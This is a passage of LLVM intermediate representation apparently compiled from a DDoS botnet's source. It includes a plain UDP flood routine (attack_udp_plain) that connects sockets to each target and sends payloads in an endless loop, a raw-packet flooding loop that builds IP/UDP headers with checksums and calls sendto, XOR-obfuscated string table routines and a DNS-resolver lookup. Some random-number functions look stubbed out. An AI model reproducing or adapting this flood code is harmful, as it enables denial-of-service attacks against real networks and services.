  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %36
  br i1 %197, label %.lr.ph130.split, label %.preheader.loopexit146

.loopexit.loopexit:                               ; preds = %216
  br label %.loopexit.backedge

.loopexit.loopexit145:                            ; preds = %256
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %37, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit145
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %119, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %216
  %storemerge120123.us = phi i32 [ %238, %216 ], [ 0, %.lr.ph.split.us.preheader ]
  %198 = sext i32 %storemerge120123.us to i64
  %199 = getelementptr inbounds i8*, i8** %8, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 28
  %204 = getelementptr inbounds i8, i8* %200, i64 41
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br i1 %121, label %207, label %209

; <label>:207:                                    ; preds = %.lr.ph.split.us
  %208 = bitcast i8* %202 to i16*
  store i16 0, i16* %208, align 2
  br label %209

; <label>:209:                                    ; preds = %207, %.lr.ph.split.us
  br i1 %123, label %210, label %213

; <label>:210:                                    ; preds = %209
  %211 = getelementptr inbounds i8, i8* %200, i64 22
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %210, %209
  br i1 %125, label %214, label %216

; <label>:214:                                    ; preds = %213
  %215 = bitcast i8* %203 to i16*
  store i16 0, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %214, %213
  call void @rand_alphastr(i8* %204, i32 %.pre)
  %217 = getelementptr inbounds i8, i8* %200, i64 10
  %218 = bitcast i8* %217 to i16*
  store i16 0, i16* %218, align 2
  %219 = bitcast i8* %200 to i16*
  %220 = call zeroext i16 @checksum_generic(i16* %219, i32 20) #9
  store i16 %220, i16* %218, align 2
  %221 = getelementptr inbounds i8, i8* %200, i64 26
  %222 = bitcast i8* %221 to i16*
  store i16 0, i16* %222, align 2
  %223 = getelementptr inbounds i8, i8* %200, i64 24
  %224 = bitcast i8* %223 to i16*
  %225 = load i16, i16* %224, align 2
  %226 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %225, i32 %127) #9
  store i16 %226, i16* %222, align 2
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 2, i32 0
  store i32 %26, i32* %229, align 4
  %230 = getelementptr inbounds i8, i8* %200, i64 22
  %231 = bitcast i8* %230 to i16*
  %232 = load i16, i16* %231, align 2
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %232, i16* %233, align 2
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %235 = bitcast %struct.sockaddr_in* %234 to %struct.sockaddr*
  %236 = call i64 @sendto(i32 %30, i8* %200, i64 %129, i32 16384, %struct.sockaddr* %235, i32 16) #9
  %237 = load i32, i32* %5, align 4
  %238 = add nsw i32 %237, 1
  store i32 %238, i32* %5, align 4
  %239 = icmp slt i32 %238, %36
  br i1 %239, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %256
  %storemerge120123 = phi i32 [ %278, %256 ], [ 0, %.lr.ph.split.preheader ]
  %240 = sext i32 %storemerge120123 to i64
  %241 = getelementptr inbounds i8*, i8** %8, i64 %240
  %242 = load i8*, i8** %241, align 8
  %243 = bitcast i8* %242 to %struct.iphdr*
  %244 = getelementptr inbounds i8, i8* %242, i64 20
  %245 = getelementptr inbounds i8, i8* %242, i64 28
  %246 = getelementptr inbounds i8, i8* %242, i64 41
  br i1 %121, label %247, label %249

; <label>:247:                                    ; preds = %.lr.ph.split
  %248 = bitcast i8* %244 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %247, %.lr.ph.split
  br i1 %123, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %242, i64 22
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %125, label %254, label %256

; <label>:254:                                    ; preds = %253
  %255 = bitcast i8* %245 to i16*
  store i16 0, i16* %255, align 2
  br label %256

; <label>:256:                                    ; preds = %254, %253
  call void @rand_alphastr(i8* %246, i32 %.pre)
  %257 = getelementptr inbounds i8, i8* %242, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %242 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20) #9
  store i16 %260, i16* %258, align 2
  %261 = getelementptr inbounds i8, i8* %242, i64 26
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = getelementptr inbounds i8, i8* %242, i64 24
  %264 = bitcast i8* %263 to i16*
  %265 = load i16, i16* %264, align 2
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %243, i8* %244, i16 zeroext %265, i32 %127) #9
  store i16 %266, i16* %262, align 2
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0, i32 2, i32 0
  store i32 %26, i32* %269, align 4
  %270 = getelementptr inbounds i8, i8* %242, i64 22
  %271 = bitcast i8* %270 to i16*
  %272 = load i16, i16* %271, align 2
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0, i32 1
  store i16 %272, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %30, i8* %242, i64 %129, i32 16384, %struct.sockaddr* %275, i32 16) #9
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %36
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit145

; <label>:280:                                    ; preds = %28, %4, %116
  ret void

; <label>:281:                                    ; preds = %.lr.ph128.us.1147
  %282 = add i8 %.1.us, 1
  br label %286

; <label>:283:                                    ; preds = %.lr.ph128.us.1147
  store i8 %.1.us, i8* %.1119.us, align 1
  %284 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv.next
  %285 = getelementptr inbounds i8, i8* %284, i64 1
  br label %286

; <label>:286:                                    ; preds = %283, %281
  %.1119.us.1 = phi i8* [ %285, %283 ], [ %.1119.us, %281 ]
  %.1.us.1 = phi i8 [ 0, %283 ], [ %282, %281 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.us.loopexit.unr-lcssa, label %.lr.ph128.us

; <label>:287:                                    ; preds = %.lr.ph128.1150
  %288 = add i8 %.1, 1
  br label %292

; <label>:289:                                    ; preds = %.lr.ph128.1150
  store i8 %.1, i8* %.1119, align 1
  %290 = getelementptr inbounds i8, i8* %171, i64 %indvars.iv.next136
  %291 = getelementptr inbounds i8, i8* %290, i64 1
  br label %292

; <label>:292:                                    ; preds = %289, %287
  %.1119.1 = phi i8* [ %291, %289 ], [ %.1119, %287 ]
  %.1.1 = phi i8 [ 0, %289 ], [ %288, %287 ]
  %indvars.iv.next136.1 = add nsw i64 %indvars.iv135, 2
  %exitcond138.1 = icmp eq i64 %indvars.iv.next136.1, %wide.trip.count
  br i1 %exitcond138.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph128
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 30)
  %3 = tail call i8* @table_retrieve_val(i32 30, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #9
  tail call void @table_lock_val(i8 zeroext 30)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #9
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #9
  tail call void @table_unlock_val(i8 zeroext 31)
  %11 = tail call i8* @table_retrieve_val(i32 31, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #9
  call void @table_lock_val(i8 zeroext 31)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #9
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #9
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #10
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #9
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #10
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #9
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 17) #9
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #9
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #10
  %49 = call i32 @htonl(i32 %48) #10
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #9
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #9
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #9
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #10
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 17) #9
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #9
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #10
  %90 = call i32 @htonl(i32 %89) #10
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #9
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #7 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.017 = phi i8* [ %.0.be, %.backedge ], [ %0, %.lr.ph.preheader ]
  %.01316 = phi i32 [ %8, %.backedge ], [ %1, %.lr.ph.preheader ]
  %4 = icmp ugt i32 %.01316, 3
  br i1 %4, label %.preheader.preheader, label %6

.preheader.preheader:                             ; preds = %.lr.ph
  %5 = bitcast i8* %.017 to i32*
  store i32 1633771873, i32* %5, align 1
  %scevgep = getelementptr i8, i8* %.017, i64 4
  br label %.backedge

; <label>:6:                                      ; preds = %.lr.ph
  %7 = getelementptr inbounds i8, i8* %.017, i64 1
  store i8 0, i8* %.017, align 1
  br label %.backedge

.backedge:                                        ; preds = %.preheader.preheader, %6
  %.sink = phi i32 [ -1, %6 ], [ -4, %.preheader.preheader ]
  %.0.be = phi i8* [ %7, %6 ], [ %scevgep, %.preheader.preheader ]
  %8 = add i32 %.01316, %.sink
  %9 = icmp sgt i32 %8, 0
  br i1 %9, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #8 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #8 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #8 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #8 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

